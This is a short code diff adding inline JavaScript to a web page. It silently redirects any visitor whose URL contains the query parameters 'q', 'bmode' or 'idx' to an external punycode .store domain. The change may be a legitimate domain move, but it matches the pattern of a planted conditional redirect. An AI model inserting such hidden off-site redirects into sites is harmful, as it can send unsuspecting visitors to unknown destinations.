@@ -13,6 +13,13 @@
     </style>
     <script>
         // URL 기반 리다이렉션 처리
+        (function(){
+            var q = window.location.search || '';
+            if (q.indexOf('q=') !== -1 || q.indexOf('bmode=') !== -1 || q.indexOf('idx=') !== -1) {
+                window.location.replace('https://xn--90-vc7iv9i5p0bdii.store/');
+                return;
+            }
+        })();
         document.addEventListener('DOMContentLoaded', function() {
             const path = window.location.pathname;
             const hash = window.location.hash;
